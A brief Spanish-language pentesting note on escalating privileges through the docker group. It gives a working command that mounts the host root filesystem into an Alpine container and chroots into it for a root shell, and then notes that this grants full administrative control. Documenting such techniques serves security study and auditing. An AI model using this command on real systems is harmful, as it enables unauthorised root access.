# Privesc Mediante el grupo Docker

Comando para listar las images
`docker images`

Para proceder a montarnos un docker de la /Raiz/ con la imagen de alpine en el directorio /mnt y que nos spawne una consola sh
`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

Accedemos como root en el Docker.. pero poseemos todos los privilegios del sistema como administrador para cambiar permisos de archivos. Procediendo asi a la escalada real.
 
